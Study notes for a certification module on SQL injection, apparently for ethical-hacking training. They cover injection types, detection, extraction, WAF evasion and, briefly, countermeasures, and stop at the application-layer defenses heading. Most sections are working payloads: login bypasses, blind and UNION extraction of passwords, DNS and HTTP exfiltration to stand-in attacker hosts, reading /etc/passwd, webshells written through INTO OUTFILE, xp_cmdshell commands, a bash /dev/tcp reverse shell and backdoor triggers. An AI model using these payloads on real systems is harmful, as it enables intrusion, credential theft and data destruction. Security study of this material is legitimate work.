# Module 15 – SQL Injection

> Status: ✅ Reference complete

## 1. SQL injection concepts
**SQL** (Structured Query Language) is the textual language a database server uses; core commands: `INSERT`, `SELECT`, `UPDATE`, `DELETE`. **SQL injection** is a web-app vulnerability that occurs when developers build sequential SQL commands with user-supplied input without validation/sanitization. The attacker injects malicious SQL into input fields (login forms, search boxes) that the app passes to the backend DB for execution → bypass authentication, gain unauthorized access, or extract sensitive data. SQLi does not target the software itself — it exploits poorly written code to manipulate database queries.

### What SQL injection can achieve
- **Authentication bypass** — log in without valid username/password, gain admin privileges.
- **Authorization bypass** — alter authorization info stored in the DB.
- **Information disclosure** — obtain sensitive stored data.
- **Compromised data integrity** — deface pages, inject content, alter DB contents.
- **Compromised availability** — delete DB data, logs, or audit info.
- **Remote code execution** — compromise the host OS.

### Server-side technologies
ASP.NET, PHP, JSP, etc. build dynamic, data-driven apps against MySQL / Oracle / SQL Server. Ignoring secure coding makes them SQLi-vulnerable.

### How a query becomes an injection
- **HTTP POST** sends data in the request body (more suitable than GET for larger/sensitive data, e.g. login). Example backend check:
  ```sql
  select * from Users where (username = 'smith' and password = 'simpson');
  ```
- **Normal query** — built from user-supplied values, executed to return results.
- **Injection query** — malicious input changes the query's logic. Classic login bypass:
  ```
  Username: Blah' or 1=1 --
  Password: Pe***&4**
  ```
  becomes
  ```sql
  SELECT Count(*) FROM Users WHERE UserName='Blah' or 1=1 --' AND Password='Pe***&4**';
  ```
  `or 1=1` is always true; `--` comments out the rest → returns a valid response without valid credentials.

### Code analysis
The vulnerable concatenation that makes it possible:
```csharp
string strQry = "SELECT Count(*) FROM Users WHERE UserName='" + txtUser.Text + "' AND Password='" + txtPassword.Text + "'";
```
Entering `blah' or 1=1 --` collapses the executed query to `SELECT Count(*) FROM Users WHERE UserName='blah' Or 1=1`.

### Vulnerable app example (BadProductList.aspx)
Uses the `txtFilter` textbox directly in the query. Enumerate user tables, then dump credentials:
```sql
UNION SELECT id, name, '', 0 FROM sysobjects WHERE xtype ='U' --   -- list user-created tables (reveals Users)
UNION SELECT 0, UserName, Password, 0 FROM Users --                -- dump login credentials
```
The **Search field** is another common injection target (as with any input field).

### Example SQLi queries
| Goal | Injected input |
|------|----------------|
| Update a table | `blah'; UPDATE jb-customers SET jb-email='info@certifiedhacker.com' WHERE email='jason@springfield.com; --` |
| Add a record | `blah'; INSERT INTO jb-customers ('jb-email','jb-passwd','jb-login_id','jb-last_name') VALUES ('jason@springfield.com','hello','jason','jason springfield');--` |
| Identify a table name | `blah' AND 1=(SELECT COUNT(*) FROM mytable); --` (guess table names) |
| Delete a table | `blah'; DROP TABLE Creditcard; --` |
| Return more data | `OR 1=1` |

## 2. Types of SQL injection
Three main categories:
- **In-band** — same channel to inject and retrieve results (most common, easy). Sub-types below.
- **Blind / inferential** — no error messages or direct output; infer data from app behavior (true/false responses).
- **Out-of-band** — different channel (DB email, file write/load, DNS/HTTP) to exfiltrate; harder, needs DB feature knowledge.

### In-band sub-types
- **Error-based** — send invalid input to trigger DB errors that reveal structure; craft further queries from leaked detail.
- **System stored procedure** — dynamic SQL in a stored procedure with unsanitized input. Vulnerable `Login` proc with `username = anyusername or 1=1'` bypasses auth.
- **Illegal / logically incorrect query** — faulty input (e.g. `Bob"`) triggers a syntax error like `Incorrect Syntax near 'Bob'. Unclosed quotation mark...`, exposing structure.
- **UNION SQL injection** — `UNION SELECT` merges a malicious query with the legitimate one:
  ```sql
  SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
  ```
  The `1,1` pad to match the original column count. Test with a trailing `'` (`page.php?id=1'`).
- **Tautology** — inject an always-true `OR`: `SELECT * FROM users WHERE name='' OR '1'='1';`
- **End-of-line comment** — `--` ignores the rest: `... WHERE username='admin'--' AND password='password'`.
- **In-line comments** — `/* */` hides/alters parts. Privilege escalation example:
  ```
  UserName = Attacker', 1, /*
  Password = */'mypwd
  ```
  → `INSERT INTO Users (UserName, isAdmin, Password) VALUES ('Attacker', 1, /*', 0, '*/'mypwd')` (sets `isAdmin=1`).
- **Piggybacked query** — append a second query with `;` (needs batched-query support):
  ```sql
  SELECT * FROM EMP WHERE EMP.EID=1001 AND EMP.ENAME='Bob'; DROP TABLE DEPT;
  ```

### Error-based detail
Force the DB's own error handler to leak data. Oracle example resolving a hostname from the current user:
```
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--
→ ORA-292257: host SCOTT unknown   (leaks username SCOTT)
```

### UNION detail
1. Find column count with `ORDER BY 10--` (error = fewer columns) — step down until it runs.
2. Find data types with `UNION SELECT 1,null,null--`.
3. Extract: `1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`.

### Blind / inferential detail
- **No error message** — if generic errors are off and only a custom page shows, the attacker must infer via behavior.
- **Time-based** — `WAITFOR DELAY` / `SLEEP` / `BENCHMARK`:
  ```sql
  IF EXISTS(SELECT * FROM creditcard) WAITFOR DELAY '0:0:10'--
  WAITFOR DELAY '0:0:10'--            -- MSSQL, seconds
  BENCHMARK(howmanytimes, do this)    -- MySQL
  ```
- **Boolean exploitation** — compare `AND 1=1` (page returns) vs `AND 1=2` (nothing):
  ```
  http://www.myshop.com/item.aspx?id=67 AND 1=1   -- item shown
  http://www.myshop.com/item.aspx?id=67 AND 1=2   -- blank
  ```
- **Heavy query** — when `SLEEP()` is disabled, force resource-heavy joins to create delay (Oracle):
  ```sql
  SELECT count(*) FROM all_users A, all_users B, all_users C
  1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C
  ```

### Out-of-band detail
When data can't return in-band, use DNS/HTTP: MSSQL `xp_dirtree` (DNS requests to an attacker domain), Oracle `UTL_HTTP` (HTTP request from SQL/PL-SQL to an attacker server).

## 3. Information gathering & vulnerability detection

### Information gathering steps
1. Check if the app connects to a DB server for data.
2. List all input fields, hidden fields, POST requests whose values could craft an SQL query.
3. Inject code into input fields to generate an error.
4. Insert a string where a number is expected.
5. Use `UNION` to combine result sets.
6. Read detailed error messages for actionable info (DB type, version, users, privileges, OS interaction).

### Identifying data entry paths
Find every point accepting input (form fields, hidden fields, cookies); analyze GET/POST with **Burp Suite** (intercept/modify traffic, find SQLi/XSS) or **Tamper Dev** (intercept & edit HTTP/HTTPS requests and responses).

### Extracting info through error messages
- **Parameter tampering** — change GET/POST values (e.g. `download.php?id=car` → `id=horse`) to trigger informative errors (DB type, directory structure, SQL functions). Tools: Burp, Tamper Chrome.
- **Determining DB engine type** — trigger ODBC errors (include driver info → expose DB type); else guess from OS/web server.
- **Determining a SELECT query structure** — force errors to learn table/column names/types:
  ```sql
  ' and '1'='1
  ' and '1'='2
  ' group by columnnames having 1=1 --
  ```
- **Injections (WHERE clause)** — `SELECT * FROM table WHERE x='normalinput' group by x having 1=1 --`.
- **Grouping error** — `group by columnnames having 1=1 --` returns results (always true).
- **Type mismatch** — insert strings into numeric fields:
  ```sql
  ' union select 1,1,'text',1,1,1 --
  ' union select 1,1, bigint,1,1,1 --
  ```
- **Blind injection** — time delays / error signatures:
  ```sql
  '; if condition waitfor delay '0:0:5' --
  '; union select if( condition , benchmark (100000, sha1('test')), 'false' ),1,1,1,1;
  ```
  > If no detailed errors (just `500 Server Error` / custom page), use blind techniques.

### SQL injection testing strings (cheat sheet)
```
||6                 or 1=1--                " or "a"="a           Admin' OR '
' ||'6              ' or 1 in (select @@version)--                ' having 1=1--
(| |6)              ' group by userid having 1=1--               ' OR 'text' = N'text'
' OR 1=1--          ' union all select @@version--               ' OR 2 > 1
OR 1=1              '; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
' OR '1'='1         CRATE USER name IDENTIFIED BY 'pass123'       ' OR 'text' > 't'
; OR '1'='1         ' union select 1,load_file('/etc/passwd'),1,1,1;
%27+--+             '; exec master..xp_cmdshell 'ping 10.10.1.2'--
" or 1=1--          exec sp_addsrvrolemember 'name','sysadmin'    ' OR 'unusual' = 'unusual'
' or 1=1 /*         GRANT CONNECT TO name; GRANT RESOURCE TO name; ' OR 'something' = 'some'+'thing
' or 1/*            ' union select * from users where login = char(114,111,111,116);
'//OR//1//=//1      '; EXEC ('SEL' + 'ECT US' + 'ER')             ' OR 'something' like 'some%'
Password:*/=1--     UNI//ON SEL//ECT                              ' OR 'whatever' in ('whatever')
exec sp_addlogin 'name','password'                                ' OR 2 BETWEEN 1 and 3
@var select @var as var into temp end --                          ' or username like char(37);
' and 1 in (select var from temp)--     ' ; drop table temp --
%27+OR+%277659%27%3D%277659             %22+or+isnull%281%2F0%29+%2F*
```

### Additional detection methods
- **Function testing** (black box) — probe with crafted inputs:
  ```
  ?parameter=123       ?parameter=1'        ?parameter=1'#       ?parameter=1"
  ?parameter=1 AND 1=1--   ?parameter=1'-    ?parameter=1 AND 1=2--   ?parameter=1'/*
  ?parameter=1' AND '1'='1     ?parameter=1 order by 1000
  ```
- **Fuzz testing** — send large random "fuzz" and watch for crashes/anomalies. Tools: BeSTORM, Burp Suite, AppScan Standard, Defensics, SnapFuzz.
- **Static testing** (source-code analysis) & **dynamic testing** (runtime behavior).

### Black-box pen testing steps
1. Detect SQLi with a single quote `'` (SQL error).
2. Detect SQLi with a double quote `"`.
3. Detect input sanitization with `]`.
4. Detect truncation with a very long string.
5. Detect SQL modification with a single-quote flood `''''....`.
6. Detect modification with `]` / `"` floods (overflow `REPLACE`/`QUOTENAME`).

### Source-code review (white box)
- **Static code analysis** — Taint Analysis, Lexical Analysis, Data Flow Analysis (code not running).
- **Dynamic code analysis** — test while running.
- Tools: Veracode, SonarQube, PVS-Studio, Coverity Scan, Parasoft Jtest, CAST AIP, Klocwork.

### Testing blind SQLi (MySQL / MSSQL)
```
shop.com/items.php?id=101 and 1=0    -- always FALSE (no page)
shop.com/items.php?id=101 and 1=1    -- TRUE (original items page) → vulnerable
```

## 4. Launch SQL injection attacks

### Error-based (MSSQL `convert`)
```
?id=1 or 1=convert(int,(DB_NAME))--                                          -- DB name
?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--   -- 1st table
?id=1 or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--   -- 1st column
?id=1 or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--      -- 1st field value
```
The nvarchar→int conversion error leaks each value.

### Stored-procedure injection
Dynamic SQL inside a procedure concatenating input:
```sql
Set @sqlstring = 'Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd
```
`anyusername or 1=1'` bypasses auth. A `get_report` proc with input `1 from users; update users set password='password'; select *` also updates all passwords.

### Union-based extraction (MSSQL)
```
?id=1 ORDER BY 3--                                                           -- column count
?id=1 UNION ALL SELECT 1,2,3--
?id=1 UNION SELECT ALL 1,DB_NAME,3,4--                                       -- DB name
?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--  -- tables
?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name='EMPLOYEE_TABLE'--  -- columns
?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --              -- field data
```

### Bypass website logins
```
admin' --        admin' #        admin'/*
' or 1=1--       ' or 1=1#       ' or 1=1/*
') or '1'='1--   ') or ('1'='1--
```
- **Login as another user:** `' UNION SELECT 1,'anotheruser','doesnt matter', 1--`
- **MD5 bypass:** force a known hash —
  ```
  Username: admin
  Password: 1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
  ```
  (`81dc9bdb...` = MD5 of `1234`).

### Blind – Boolean exploitation (MySQL)
Test each password character by ASCII:
```
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),1,1))=97,555,777)   -- 1st char = 'a'?
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),2,1))=97,555,777)   -- 2nd char
```

### Blind – time-based extraction (MSSQL)
Extract the DB **user** (length then each char):
```
?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--          -- increase until TRUE
?id=1; IF(ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--   -- char 1 = 'a'
?id=1; IF(ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   -- char 2
```
Extract the **DB name**:
```
?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--
?id=1;IF(ASCII(lower(substring((DB_NAME()),1,1)))=97) WAITFOR DELAY '00:00:10'--
```
Extract **1st table**:
```
?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=3) WAITFOR DELAY '00:00:10'--
?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=101) WAITFOR DELAY '00:00:10'--
```
Extract **column names** (`information_schema.columns`), using `and column_name>'EID'` to step to the next column. Extract **row data** with the same `LEN` + `ASCII(substring(...))` pattern (e.g. `SELECT TOP 1 EID from EMP` → "JOE").
> Binary search finds a char in ~7 requests → an 8-char name ≈ 56 requests.

### Regular-expression (REGEXP/LIKE) extraction
MySQL — narrow the first char by range:
```
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)
... REGEXP '^[a-c]' ...   ... REGEXP '^[d-f]' ...   ... REGEXP '^[d-e]' ...   ... REGEXP '^[d]' ...
```
MSSQL — second char via `LIKE`:
```
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)
... LIKE 'd[0-9]%' ...  'd[0-4]%' ...  'd[5-9]%' ...  'd[5-7]%' ...  'd[8]%' ...
```
Hashed passwords contain only `[a-f0-9]`.

### Double-blind SQL injection
No direct feedback; infer from side channels (behavior, timing). Time-based with `benchmark()`/`sleep()`:
```
/?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))
```

### Out-of-band exploitation
Force the DB to send data to an attacker server (Oracle `UTL_HTTP`):
```
http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)--
```
Capture with Netcat:
```
/home/tester/nc -nLp 80
GET /SCOTT HTTP/1.1
Host: testerserver.com
```

### Second-order SQL injection
Malicious input is stored safely, then reused in a later query without parameterization. Register username `test' --`; when the stored value is used in another query, the injection fires. Flow: submit crafted input → app stores it → attacker makes a second request → app uses the stored input in a query → injection executes.

### Bypass WAF / firewall
- **Normalization** — misconfigured WAF: `/?id=1/*union*/union/*select*/select+1,2,3/*`.
- **HPP (HTTP Parameter Pollution)** — split across duplicate params: `/?id=1;select+1&id=2,3+from+users+where+id=1--`.
- **HPF (HTTP Parameter Fragmentation)** — `/?a=1+union/*&b=*/select+1,2` → `... a=1 UNION/* AND b=*/SELECT 1,2`.
- **Blind** — `?id=1 OR 0x50=0x50`; `?id=1 AND ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74`. Negation/inequality logic: `and 1`, `and 1=1`, `and 2<3`, `and 'a'='a'`, `and 'a'<>'b'`, `and 3<=2`.
- **Signature bypass** — rewrite structure:
  ```
  /?id=1+union+(select+'xz'from+xxx)
  /?id=(1)union(select(1),mid(hash,1,32)from(users))
  /?id=1+union+(select'1',concat(login,hash)from+users)
  /?id=(1)union(((((((select(1),hex(hash)from(users))))))))
  /?id=xx(1)or(0x50=0x50)
  ```
- **Buffer overflow** — crash the C/C++ WAF with ~1200 `A`s + obfuscated keywords → `500` → bypass.
- **CRLF** — CR(13)/LF(10): `info.php?id=1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--`.
- **Integration** — combine techniques (`/*!uNIOn*/`, `/*!50000...*/` versioned comments, etc.).
- **JSON-based** — embed payload in JSON keys/values to dodge `= < >` signatures:
  ```json
  {"user": "<username>' --","pass": "irrelevant"}
  ```

### Insert a user / update a password
```sql
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com'; INSERT INTO Users (Email_ID,User_Name,Password) VALUES ('Clark@mymail.com','Clark','MyPassword');--
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com'; UPDATE Users SET Email_ID='Clark@mymail.com' WHERE Email_ID='Alice@xyz.com';
```
(Insert needs `INSERT` permission and no blocking dependencies. The UPDATE hijacks "Forgot Password" to the attacker's email.)

## 5. Advanced SQL injection
Move beyond data to compromise the OS and network — run OS commands, read/write files, plant Trojans/keyloggers, pivot across the network.

### Enumeration
- **User-level privilege** — scalar functions `user`, `current_user`, `session_user`, `system_user`:
  ```sql
  ' and 1 in (select user ) --
  '; if user='dbo' waitfor delay '0:0:5'--                                   -- confirm dbo (MSSQL)
  ' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );  -- root (MySQL)
  ```
- **DB admin accounts:** sa, system, sys, dba, admin, root; `dbo` has implied full rights.
- **Discover structure:**
  ```sql
  ' group by columnnames having 1=1 --                                       -- table/column names
  ' union select sum(columnname) from tablename --                           -- column type
  ' and 1 in (select min(name) from sysobjects where xtype='U' and name>'.') --  -- user tables
  ```
- **Column enumeration by DBMS:**
  ```sql
  -- MSSQL
  SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')
  sp_columns tablename
  -- MySQL
  show columns from tablename
  -- Oracle
  SELECT * FROM all_tab_columns WHERE table_name='tablename'
  -- DB2
  SELECT * FROM syscat.columns WHERE tabname='tablename'
  -- PostgreSQL
  SELECT attnum,attname from pg_class, pg_attribute WHERE relname='tablename' AND pg_class.oid=attrelid AND attnum>0
  ```
- **DB objects for enumeration:** Oracle (SYS.USER_OBJECTS, SYS.USER_TABLES, SYS.USER_VIEWS, SYS.ALL_TABLES, SYS.USER_TAB_COLUMNS); MS Access (MSysAccessObjects, MSysACEs, MSysObjects, MSysQueries, MSysRelationships); MySQL (mysql.user, mysql.db, mysql.tables_priv); MSSQL (sys.objects, sys.columns, sys.types, sys.databases).
- **All tables+columns in one query:**
  ```sql
  ' union select 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name, 1,1,'1',1,1,1,1,1 from sys.objects, sys.columns, sys.types where sys.objects.xtype='U' AND sys.objects.id=sys.columns.id AND sys.columns.xtype=sys.types.xtype --
  ```
- **Databases on server:** `' and 1 in (select min(name) from master.dbo.sys.databases where name>'.') --`; file locations with `min(filename)`.

### DBMS feature differences
| Feature | MySQL | MSSQL | MS Access | Oracle | DB2 | PostgreSQL |
|---------|-------|-------|-----------|--------|-----|------------|
| String concat | `concat(,)`, `concat_ws(delim,)` | `''+''` | `""&""` | `''||''` | `"concat"` / `""+""` | `''||''` |
| Comments | `--`, `/* */`, `#` | `--`, `/* */` | No | `--`, `/* */` | `--` | `--`, `/* */` |
| UNION | union | union, `;` | union | union | union | union, `;` |
| Sub-requests | Yes | Yes | No | Yes | Yes | Yes |
| Stored procs | Yes | Yes | Yes | Yes | Yes | Yes |
| information_schema | Yes | Yes | Yes | Yes | Yes | Yes |

### Create database accounts
```sql
-- MSSQL
exec sp_addlogin 'victor','Pass123'   exec sp_addsrvrolemember 'victor','sysadmin'
-- Oracle
CREATE USER victor IDENTIFIED BY Pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; GRANT CONNECT TO victor; GRANT RESOURCE TO victor;
-- MS Access
CREATE USER victor IDENTIFIED BY 'Pass123'
-- MySQL
INSERT INTO mysql.user (user,host,password) VALUES ('victor','localhost',PASSWORD('Pass123'))
```

### Password & hash grabbing
- **Password grabbing** (loop logins+passwords into a temp table, read via error):
  ```sql
  begin declare @var varchar(8000) set @var=':' select @var=@var+' '+login+'/'+password+' ' from users where login>@var select @var as var into temp end; --' and 1 in (select var from temp) --' ; drop table temp --
  ```
- **SQL Server hashes** — read `sys.syslogins`, hex-encode binary hashes (loop converting each byte to hex), or leak via error messages with `substring(x,256,256)`; crack offline.

### Transfer DB to attacker (OPENROWSET)
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;','select * from mydatabase..hacked_sysdatabases') select * from sys.sysdatabases --
-- repeat targeting sys.sysobjects, sys.syscolumns, table1, table2 → exfil schema + data over port 80
```

### Interacting with the OS
Two routes: read/write disk files, or direct command execution via remote shell.
```sql
-- MSSQL: run command, pull output back
'; exec master..xp_cmdshell 'ipconfig > test.txt' --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
'; begin declare @data varchar(8000); set @data='| '; select @data=@data+txt+' | ' from tmp where txt<@data; select @data as x into temp end --
' and 1 in (select substring(x,1,256) from temp) --
'; declare @var sysname; set @var='del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
-- MySQL: user-defined functions
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
```
> Restricted by DB running privileges/permissions.

### Interacting with the file system (MySQL)
```sql
NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*                             -- read a file
NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*   -- write a webshell
-- then: http://www.certifiedhacker.com/shell.php?command=wget ...
```

### Network reconnaissance (via xp_cmdshell)
```sql
' and 1 in (select @@servername ) --
' and 1 in (select srvname from sys.sysservers ) --
'; exec master..xp_cmdshell 'nslookup a.com MyIP' --                         -- reverse DNS
'; exec master..xp_cmdshell 'ping 10.0.0.75' --                              -- reverse ping
'; select * from OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=10.0.0.75,80;','select * from table')
```
Full recon payload writes `arp -a`, `ipconfig /all`, `nbtstat -c`, `netstat -ano`, `route print`, `tracert` into `test.txt`, bulk-loads it, reads it back via `substring`, then cleans up (`del test.txt`, `drop table`).
> `xp_cmdshell` is disabled by default: `EXEC sp_configure 'xp_cmdshell',1 GO RECONFIGURE GO`.

### Find & bypass admin panel
Google dorks: `inurl:"adminlogin.aspx"`, `inurl:"admin/index.php"`, `inurl:"administrator.php"`, `inurl:"/admin/"`, `inurl:"login.aspx"`, `inurl:"/admin/login.php"`, etc. Auth-bypass payloads:
```
' or 1=1 --      1'or'1'='1      admin'--      " or 0=0 --      ' or 0=0 #
' or 'x'='x      ") or ('x'='x    ' or 1=1--     " or 1=1--       or 1=1--
```

### PL/SQL exploitation (Oracle)
Dynamic query concatenating input in `Validate_UserPassword`:
```sql
EXEC Validate_UserPassword('Bob', ''' OR ''1''=''1');     -- bypass password check
EXEC Validate_UserPassword('Alice', '''; UPDATE User_Details SET Password=''Hacked'' WHERE UserName=''Alice'' --');  -- alter data
```
**Countermeasures:** minimize dynamic SQL input, validate/sanitize, use `DBMS_ASSERT`, use bind parameters, avoid single quotes / use secure string params, least privilege, review/test PL/SQL, custom error handling.

### Create server backdoors
- **OS shell** — `xp_cmdshell` (MSSQL) / `SELECT ... INTO OUTFILE` (MySQL) / stored procedures for persistence.
- **Webshell via OUTFILE:** `SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'`.
- **Find web root:** `SELECT @@datadir;`.
- **Reverse shell:** `EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'`.
- **Database triggers (Oracle):**
  ```sql
  CREATE OR REPLACE TRIGGER SET_PRICE AFTER INSERT OR UPDATE ON ITEMS FOR EACH ROW BEGIN UPDATE ITEMS SET Price=0; END;   -- free items
  CREATE OR REPLACE TRIGGER CREATE_BACKDOOR_USER AFTER DELETE ON USERS FOR EACH ROW BEGIN INSERT INTO USERS (username,password,role) VALUES ('attacker','maliciousPass','admin'); END;   -- self-restoring admin
  ```

### HTTP header-based SQL injection
Headers stored without sanitization are injectable:
- **X-Forwarded-For** — `X_FORWARDED_FOR: 10.10.10.11' or 1=1#` (bypasses a `sanitize()` that only cleans the login field).
- **User-Agent** — `User-Agent: aaa' or 1/*`.
- **Referer** — `Referer: http://www.hackerswebsite.com` (stored unsanitized).
- **Cookie** — first variable to test (stored for session identification).

### DNS exfiltration
```sql
do_dns_lookup((select top 1 password from users) + '.certifiedhacker.com');   -- password hash in the DNS query
-- MS SQL via xp_dirtree
DECLARE @hostname varchar(1024); SELECT @hostname=(SELECT HOST_NAME())+'.appserver.example.com'; EXEC('master.dbo.xp_dirtree "\\'+@hostname+'\c$"');
```
Firewalls often block direct egress but let DNS pass — attacker's DNS server logs the leaked data.

### MongoDB / NoSQL injection
Inject operators (`$eq`, `$ne`, `$gt`, `$gte`, `$regex`) into unvalidated input. Auth bypass payload:
```
User_name[$eq]=admin&pwd[$ne]=admin        -- matches any admin regardless of password
```
**JavaScript injection via `$where`:**
```
'; return '' == '        → this.username === ''; return '' == ''   (always true → dump all users)
while(true)              → infinite loop → DoS
```

## 6. Evasion techniques
Signature-based IDS/WAF detect known patterns; evasion changes the payload's appearance while preserving function.

### Signature evasion types
In-line comment, char encoding, string concatenation, obfuscated code, white-space manipulation, hex encoding, sophisticated matches, URL encoding, null byte, case variation, declare variables, IP fragmentation, variation.

### In-line comment
```sql
'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'admin'--   -- split keywords too
```

### Char encoding (`char()`)
```sql
' union select 1, (load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;   -- /etc/passwd
' or username like char(37);                                                          -- %
' union select * from users where login = char(114,111,111,116);                      -- root
' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));                -- n.ext
```

### String concatenation
```
MSSQL:  OR 'Simple'='Sim'+'ple'       ; EXEC ('DRO' + 'P T' + 'AB' + 'LE')
Oracle: ; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
MySQL:  ; EXECUTE CONCAT('INSE','RT US','ER')
```

### Obfuscated code
Two ways: **wrapping** (tools disguise the query) and **SQL string obfuscation** (break/encrypt/hash then rebuild at runtime). Obfuscating "qwerty":
```sql
Reverse(concat(if(1,char(121),2),0x74,right(left(0x567210,2),1),lower(mid('TEST',2,1)),replace(0x7074,'pt','w'),char(instr(123321,33)+110)))
```
Signature bypass variations:
```
/?id=(1)unIon(selEct(1),mid(hash,1,32)from(test.users))
/?id=1+union+(sELect'1',concat(login,hash)from+test.users)
/?id=(1)union(((((((select(1),hex(hash)from(test.users))))))))
```

### White-space manipulation
`UNION    SELECT` (extra/tab/CR/LF) or drop spaces: `'OR'1'='1'` instead of `' OR '1'='1'`.

### Hex encoding
```
SELECT @@version            → 0x73656c65637420404076657273696f6e
DROP Table CreditCard       → 0x44524f50205461626c652043726564697443617264
SELECT keyword              → 0x73656c656374
```

### Sophisticated matches (alt. for `OR 1=1`)
```
OR 'john'='john'      OR 'john'=N'john'
' OR 'microsoft'='micro'+'soft'   ' OR 'movies'=N'movies'   ' OR 'software' like 'soft%'
' OR 7 > 1    ' OR 'best' > 'b'   ' OR 'whatever' IN ('whatever')   ' OR 5 BETWEEN 1 AND 7
```
**SQLi characters:** `'`/`"` string indicators, `--`/`#` single-line comment, `/*...*/` multi-line, `+`/`||` concat, `%` wildcard, `@var` local, `@@var` global, `waitfor delay '0:0:10'` time delay, `PRINT` non-transactional.

### URL encoding
```
' UNION SELECT Password FROM Users_Data WHERE name='Admin'--
→ %27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94
Double-encode if blocked (% → %25): %2527%2520UNION%2520SELECT...
```

### Null byte
`%00' UNION SELECT Password FROM Users WHERE UserName='admin'--` (C/C++ treats `%00` as string end; PHP/ASP may ignore it).

### Case variation
`UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE='AdMIn'--` (SQL is case-insensitive).

### Declare variables
```sql
; declare @sqlvar nvarchar(70); set @sqlvar=(N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)
```

### IP fragmentation
Split the payload across packets (`UNI` / `ON SEL` / `ECT password FROM users`); IDS inspecting fragments individually misses it. Tricks: pause so IDS times out, reverse order, send first fragment last, last fragment first, random order.

### Variation
Endless always-true forms: `OR 1=1`, `OR 2=2`, `OR 1+1=2`, `OR "evade"="ev"+"ade"`.

## 7. Countermeasures

### Why apps are vulnerable
DB server runs OS commands; privileged DB accounts; error messages leak info; no input validation; complex software stacks; legacy code; concatenated queries.

### Core defenses
- **Parameterized queries / prepared statements** — separate input from SQL (primary defense).
- **Input validation (whitelist)** — accept only expected safe values; reject the rest.
- **Avoid dynamic SQL** — don't concatenate input into query strings.
- **Least privilege** — minimum DB permissions (read-only where possible); never run DB as root/admin.
- **Stored procedures** — with strict input validation.
- **Error handling** — custom pages, never raw DB errors.
- **Regular security testing** — pen testing, code review, automated scans.
- **Keep software updated**; **WAF**; **secure password storage** (SHA-256 + salt).
- **Firewall the SQL server** — only trusted hosts; restrict to TCP 1433 / UDP 1434; block the rest.
- **Minimize privileges** + **consistent coding standards** (validation both client & server).

### Type-safe parameters (example)
```csharp
// Vulnerable
new SqlDataAdapter("LoginStoredProcedure '" + Login.Text + "'", conn);
// Secure
SqlDataAdapter myCommand = new SqlDataAdapter("SELECT aut_lname, aut_fname FROM Authors WHERE aut_id = @aut_id", conn);
SqlParameter parm = myCommand.SelectCommand.Parameters.Add("@aut_id", SqlDbType.VarChar, 11);
parm.Value = Login.Text;
```

### Application-layer defenses
